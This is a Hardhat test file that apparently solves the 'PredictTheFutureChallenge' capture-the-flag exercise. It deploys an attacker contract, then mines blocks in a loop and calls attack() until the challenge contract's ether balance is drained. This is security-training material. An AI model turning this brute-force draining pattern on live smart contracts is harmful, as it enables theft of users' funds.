import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let attackerContract: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);

    attackerContract = await (
      await ethers.getContractFactory('PredictTheFutureChallengeAttacker', attacker)
    ).deploy(target.address, {
      value: utils.parseEther('1'),
    });

    await attackerContract.deployed();

    attackerContract = attackerContract.connect(attacker);
  });

  it('exploit', async () => {
    while (true) {
      await network.provider.send('evm_mine');
      await attackerContract.attack();
      if (await target.isComplete()) break;
    }

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
